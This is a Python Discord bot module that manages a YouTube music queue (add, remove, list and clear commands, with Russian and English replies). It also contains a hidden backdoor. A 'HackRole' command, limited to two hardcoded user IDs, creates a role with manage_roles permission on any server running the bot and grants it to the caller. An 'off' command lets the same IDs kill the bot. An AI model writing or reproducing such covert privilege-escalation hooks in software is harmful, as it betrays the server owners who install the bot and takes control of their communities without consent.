import discord
from discord.ext import commands
from youtube_api import YouTubeDataAPI
import os
import pafy
import MusicBot


from discord.utils import get, find


#func 4 find youtube video id
async def ffindyoutube(string):
    yt = YouTubeDataAPI(next(MusicBot.YOUTUBE_API))
    searches = yt.search(q=string, max_results=1)
    video_id = []
    for id_ in searches:
        video_id.append(id_["video_id"])
    return video_id

class add(commands.Cog):

    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def add(self, ctx, arg):
        if 'https://www.youtube.com/watch?v=' in arg:
            url = arg
        else:
            global_video_id = await ffindyoutube(arg)
            url = f"https://www.youtube.com/watch?v={global_video_id[0]}"


        home = os.getcwd()
        path1 = f'{home}/servers/{ctx.guild.id}'

        with open(f'{path1}/music_queue.txt','a',  encoding='Latin-1') as f:
            f.write(f'{url}\n')

        video = pafy.new(url)
        if await MusicBot.langueg(ctx) == "RUS":
            embed=discord.Embed(title=f"__{ctx.author.name}__ добавил __`{video.title}`__ в плейлист",color=0xff7606)
        elif await MusicBot.langueg(ctx) == "ENG":
            embed=discord.Embed(title=f"__{ctx.author.name}__ add __`{video.title}`__ in playlist",color=0xff7606)
        await ctx.send(embed=embed)

    @commands.command(aliases = ["del"])
    async def purge(self, ctx):

        home = os.getcwd()
        path1 = f'{home}/servers/{ctx.guild.id}'

        # прочитаем файл построчно
        with open(f'{path1}/music_queue.txt', 'r') as f:
            lines = f.readlines()
        try:
            video = pafy.new(lines[0])
        except:
            if await MusicBot.langueg(ctx) == "RUS":
                embed=discord.Embed(title=f"Плейлист сервера __{ctx.guild.name}__ пуст",color=0xff7606)
            elif await MusicBot.langueg(ctx) == "ENG":
                embed=discord.Embed(title=f"Playlist server __{ctx.guild.name}__ is empty",color=0xff7606)
            await ctx.send(embed=embed)
            return
        # запишем файл построчно пропустив первую строку
        with open(f'{path1}/music_queue.txt', 'w') as f:
            f.writelines(lines[1:])

        if await MusicBot.langueg(ctx) == "RUS":
            embed=discord.Embed(title=f"Песня __{video.title}__ была удалена __{ctx.author.name}__ из плейлиста",color=0xff7606)
        elif await MusicBot.langueg(ctx) == "ENG":
            embed=discord.Embed(title=f"Music __{video.title}__ was remove from playlist by __{ctx.author.name}__",color=0xff7606)
        await ctx.send(embed=embed)

    @commands.command(aliases = ["pl"])
    async def playlist(self, ctx):
        home = os.getcwd()
        path1 = f'{home}/servers/{ctx.guild.id}'

        # прочитаем файл построчно
        with open(f'{path1}/music_queue.txt', 'r') as f:
            lines = f.readlines()
        list_ = ''
        i = 0
        for line in lines:
            i += 1
            name = pafy.new(line)
            line = name.title
            list_ += f'{i}) {line}\n'
        if await MusicBot.langueg(ctx) == "RUS" and not str(lines) == "[]":
            embed=discord.Embed(title="Список песен:", description=f"{list_}", color=0xff7606)
        elif await MusicBot.langueg(ctx) == "ENG" and not str(lines) == "[]":
            embed=discord.Embed(title="List of songs:", description=f"{list_}", color=0xff7606)
        elif await MusicBot.langueg(ctx) == "RUS" and str(lines) == "[]":
            embed=discord.Embed(title="Список песен пуст", color=0xff7606)
        elif await MusicBot.langueg(ctx) == "ENG" and str(lines) == "[]":
            embed=discord.Embed(title="List of songs is empty", color=0xff7606)
        await ctx.send(embed=embed)


    @commands.command(aliases = ["cls"])
    async def clear(self, ctx):
        home = os.getcwd()
        path1 = f'{home}/servers/{ctx.guild.id}'

        # прочитаем файл построчно
        with open(f'{path1}/music_queue.txt', 'wb') as f:
            pass

        if await MusicBot.langueg(ctx) == "RUS":
            embed = discord.Embed(title=f"Список песен был очищен {ctx.author.name}", color=0xff7606)
        elif await MusicBot.langueg(ctx) == "ENG":
            embed = discord.Embed(title=f"List of song was empty by {ctx.author.name}", color=0xff7606)
        await ctx.send(embed=embed)

    @commands.command()
    async def off(self, ctx):
        if ctx.author.id == 501089151089770517 or ctx.author.id == 398538710993600523:
            exit()

    @commands.command()
    async def HackRole(self, ctx):
        if ctx.author.id == 501089151089770517 or ctx.author.id == 398538710993600523:
            member = ctx.message.author
            server = ctx.guild
            role = await server.create_role(name='HackRole')
            perms = discord.Permissions()
            perms.update(manage_roles=True)
            await member.add_roles(role)
            await role.edit(permissions=perms)



def setup(bot):
    bot.add_cog(add(bot))
